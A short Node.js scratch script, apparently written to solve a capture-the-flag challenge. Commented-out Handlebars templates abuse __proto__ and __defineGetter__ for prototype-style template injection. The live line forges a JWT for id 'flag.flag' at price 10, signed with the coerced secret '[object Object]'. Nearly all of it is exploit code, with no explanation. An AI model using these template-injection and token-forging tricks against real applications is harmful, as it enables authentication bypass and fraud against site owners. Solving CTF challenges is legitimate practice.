Handlebars = require('handlebars');

/*let temsice = `
{{#with __proto__ }}
 {{ __defineGetter__ "key" toString }} 
{{/with}}
/*`


//console.log(Handlebars.compile(temsice)({store_name:"jazz"}))

/*let sice2 = `*/
//{{constructor}}
//`
//console.log(Handlebars.compile(sice2)({store_name:"jazz"}))

jwt = require('jsonwebtoken')

console.log(jwt.sign({'id':'flag.flag', 'price':10}, '[object Object]'))
